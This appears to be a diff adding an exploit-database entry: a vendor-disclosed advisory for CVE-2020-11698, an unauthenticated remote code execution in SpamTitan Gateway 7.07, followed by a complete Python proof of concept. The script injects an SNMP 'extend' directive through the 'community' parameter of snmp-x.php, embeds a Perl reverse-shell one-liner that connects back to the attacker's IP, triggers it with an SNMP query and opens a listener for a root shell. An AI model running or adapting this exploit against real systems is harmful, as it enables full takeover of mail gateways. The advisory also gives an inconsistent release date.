@@ -1,0 +1,275 @@
+# Exploit Title: SpamTitan 7.07 - Unauthenticated Remote Code Execution
+# Date: 2020-09-18
+# Exploit Author: Felipe Molina (@felmoltor)
+# Vendor Homepage: https://www.titanhq.com/spamtitan/spamtitangateway/
+# Software Link: https://www.titanhq.com/signup/?product_type=spamtitangateway
+# Version: 7.07
+# Tested on: FreeBSD
+# CVE : CVE-2020-11698
+
+---[SPUK-2020-09/SpamTitan Unauthenticated Remote Code Execution in
+snmp-x.php]------------------------------
+
+SECURITY ADVISORY:   SPUK-2020-09/SpamTitan Unauthenticated Remote
+Code Execution in snmp-x.php
+Affected Software:   SpamTitan Gateway 7.07 (possibly earlier versions)
+Vulnerability:       Unauthenticated Remote Code Execution
+CVSSv3:              10.0
+(https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+Severity:            Critical
+Release Date:        2020-04-17
+CVE:                 CVE-2020-11698
+
+I. Background
+~~~~~~~~~~~~~
+
+From www.spamtitan.com:
+
+"SpamTitan Gateway is a powerful Anti-Spam appliance that equips network
+administrators with extensive tools to control mail flow and protect against
+unwanted email and malware."
+
+II. Description
+~~~~~~~~~~~~~~~
+Improper input sanitization of the parameter "community" on the page
+snmp-x.php would allow a remote attacker to inject command directives into the
+file snmpd.conf. This would allow executing commands on the target server by
+by injecting an "extend" or "exec" SNMPD directive and querying the snmp daemon
+of the server for the correct OID.
+
+III. PoC
+~~~~~~~~
+
+Use python 3 and install the following modules: requests, pysnmp.
+If your IP is 192.168.1.5 and the target SpamTitan server is
+spamtitan.example.com, call the PoC like this:
+./poc.py -t spamtitan.example.com -i 192.168.1.5
+
+---------------------------------------------
+
+#!/usr/bin/env python
+
+# Author: Felipe Molina (@felmoltor)
+# Date: 09/04/2020
+# Python Version: 3.7
+# Summary: This is PoC for an unauthenticated RCE 0day on SpamTitan
+7.07 and previous versions.
+# The script abuses of two weaknesses on the product:
+# 1. Unauthenticated interaction with snmp-x.php script
+# 2. Injection of snmpd.conf configuration directives in multiple POST
+parameters such as "community" or "user_username" of snmp-x.php
+# Product URL: https://www.spamtitan.com/
+# Product Version: 7.07 and probably previous
+
+import requests
+requests.packages.urllib3.disable_warnings()
+import os
+import threading
+from optparse import OptionParser
+import socket
+import json
+from pysnmp.hlapi import *
+from urllib.parse import urlparse
+from time import sleep
+
+SNMPGETDELAY=5
+
+def parseoptions():
+    parser = OptionParser()
+    parser.add_option("-t", "--target", dest="target",
+                    help="Target SpamTitan URL to attack. E.g.:
+https://spamtitan.com/", default=None)
+    parser.add_option("-i", "--ip", dest="ip",
+                    help="Local IP where to listen for the reverse
+shell. Default: %s" % myip(), default=myip())
+    parser.add_option("-p", "--port", dest="port",
+                    help="Local Port where to listen for the reverse
+shell. Default: 4242", default=4242)
+    parser.add_option("-q", "--quiet",
+                    action="store_true", dest="quiet", default=False,
+                    help="Shut up script! Just give me the shell.")
+
+    return parser.parse_args()
+
+def printmsg(msg,quiet=False,msgtype="i"):
+    if (not quiet):
+        if (success):
+            print("[%s] %s" % (msgtype,msg))
+        else:
+            print("[-] %s" % msg)
+
+def info(msg,quiet=False):
+    printmsg(msg,quiet,msgtype="i")
+
+def success(msg,quiet=False):
+    printmsg(msg,quiet,msgtype="+")
+
+def fail(msg,quiet=False):
+    printmsg(msg,quiet,msgtype="-")
+
+def myip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # doesn't even have to be reachable
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
+
+
+def shellServer(ip,port,quiet):
+    servers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    servers.bind((ip, port))
+    servers.listen(1)
+    info("Waiting for incoming connection on %s:%s" % (ip,port))
+    conn, addr = servers.accept()
+    conn.settimeout(1)
+    success("Hurray, we got a connection from %s" % addr[0])
+
+    prompt =conn.recv(128)
+    prompt=str(prompt.decode("utf-8")).strip()
+    command = input(prompt)
+
+    while True:
+        try:
+            c = "%s\n" % (command)
+            if (len(c)>0):
+                conn.sendall(c.encode("utf-8"))
+                # Quit the console
+                if command == 'exit':
+                    info("\nClosing connection")
+                    conn.close()
+                    break
+                else:
+                    completeanswer=""
+                    while True:
+                        answer=None
+                        try:
+                            answer=str((conn.recv(1024)).decode("utf-8"))
+                            completeanswer+=answer
+                        except socket.timeout:
+                            completeanswer.strip()
+                            break
+                    print(completeanswer,end='')
+            command = input("")
+        except (KeyboardInterrupt, EOFError):
+            info("\nClosing connection")
+            break
+
+def triggerSNMPShell(target, community, triggeroid, port, quiet):
+    if (not quiet):
+        print("Waiting %s seconds to allow the main thread set-up the
+shell listener." % SNMPGETDELAY)
+    # Give the parent thread a few seconds to set up the shell
+listener before triggering the SNMP get query
+    sleep(SNMPGETDELAY)
+    if (not quiet):
+        print("Querying the SNMP server to launch the shell.")
+    targetp = urlparse(target)
+    errorIndication, errorStatus, errorIndex, varBinds = next(
+    getCmd(SnmpEngine(),
+           CommunityData(community, mpModel=0),
+           UdpTransportTarget((targetp.netloc, port)),
+           ContextData(),
+           ObjectType(ObjectIdentity(triggeroid)))
+    )
+    if errorIndication:
+        print("SNMP error: %s" % errorIndication)
+    elif errorStatus:
+        print('SNMP error status: %s at %s' % (errorStatus.prettyPrint(),
+                            errorIndex and varBinds[int(errorIndex) -
+1][0] or '?'))
+
+def main():
+    (options,arguments) = parseoptions()
+    q = options.quiet
+    t = options.target
+    i = options.ip
+    p = options.port
+    community="dummy"
+
+    if (t is None):
+        print("[-] Error. Specify a target (-t).")
+        exit()
+
+    if ((not "http://" in t) and (not "https://" in t)):
+        t = "http://%s/snmp-x.php" % t
+    else:
+        t = "%s/snmp-x.php" % t
+
+    if (not q):
+        print("[+] Attacking: %s.\nReceiving shell in %s:%s" % (t,i,p))
+
+    TARGETOID=".1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108"
+    # PAYLOAD="extend revshell /usr/bin/perl -e 'use
+Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh
+-i\");};'" % (i,p)
+    PAYLOAD="extend revshell /usr/bin/perl -e 'use
+Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh
+-i\");};'" % (i,p)
+    TOGGLESNMP={
+        "jaction":"toggleSNMP",
+        "newval":"1"
+    }
+    INJECTION={
+        "jaction":"saveAll",
+        "contact":"CONTACT",
+        "name":"SpamTitan",
+        "location":"LOCATION",
+        # Add our IP as allowed to query the injected "dummy" community
+        # Add also the perl payload in a new line (%0a) of the snmpd.conf file
+        "community":'%s" %s\n%s # ' % (community,i,PAYLOAD)
+    }
+
+    rev_thread = threading.Thread(target=triggerSNMPShell, args=(t,
+community, TARGETOID, 161,q))
+    rev_thread.start()
+
+    # Start a thread to listen for incoming reverse shells:
+    if (not q):
+        print("[+] Launching a reverse shell listener to wait for the shell.")
+
+    # Send the SNMP request to add a community and append an "extend"
+command to execute scripts
+    # SpamTitan would add a new line in the snmpd.conf file with the
+new community name and the "extend" script
+    inj_res = requests.post(t,INJECTION,verify=False)
+    if (inj_res.status_code == 200):
+        if (not q):
+            print("Spawning a reverse shell listener. Wait for it...")
+        shellServer(options.ip,int(options.port),options.quiet)
+    else:
+        print("Error. The target is probably not vulnerable (returned
+a %s code)." % inj_res.status_code)
+
+main()
+
+---------------------------------------------
+
+III. Impact
+~~~~~~~~~~~
+
+The snmpd daemon is running as root in the target server. The
+pressented PoC would return a root shell without need of any
+registered user in the target server. There is total loss of
+confidentiality, integrity and availability on the SpamTitan server.
+
+IV. Disclosure
+~~~~~~~~~~~~~~
+
+Reported By: Felipe Molina de la Torre
+
+Vendor Informed:        2020-04-17
+Patch Release Date:     2020-05-26
+Advisory Release Date:  2019-09-18
+
+V. References
+~~~~~~~~~~~~~
+* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11698
+* https://sensepost.com/blog/2020/clash-of-the-spamtitan/
+
+---------------------------------[SPUK-2020-09/SpamTitan
+Unauthenticated Remote Code Execution in snmp-x.php]---
